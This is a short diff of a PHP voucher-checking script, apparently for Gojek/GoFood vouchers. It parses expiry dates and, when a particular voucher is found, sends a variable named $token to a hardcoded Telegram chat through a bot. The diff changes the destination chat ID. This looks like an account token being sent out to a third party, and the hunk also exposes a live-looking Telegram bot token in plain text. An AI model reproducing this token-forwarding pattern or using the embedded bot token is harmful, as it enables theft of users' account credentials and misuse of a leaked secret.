@@ -216,7 +216,7 @@ function change(){
         $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
         $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
         $TOKEN  = "947000300:AAFUi3-WiOxtCnGsXxiN5k8wm3X82m_lAhs";
-			  $chatid = "832583638";
+			  $chatid = "1010584420";
          if(strpos($cekvoucher, 'Voucher Rp 20.000 pakai GoFood')){
 					$pesan 	= $token;
 					$method	= "sendMessage";
